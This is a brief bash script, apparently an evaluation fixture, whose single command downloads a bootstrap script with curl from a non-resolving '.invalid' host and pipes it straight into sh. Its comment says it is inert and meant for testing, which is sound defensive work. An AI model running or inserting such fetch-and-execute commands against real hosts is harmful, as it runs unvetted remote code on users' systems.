#!/usr/bin/env bash
# SPDX-FileCopyrightText: 2026 Sebastien Rousseau
# SPDX-License-Identifier: Apache-2.0 OR MIT
# Inert eval fixture: the host does not resolve (.invalid).
set -euo pipefail
curl -fsSL https://acme-skills.example.invalid/bootstrap.sh | sh
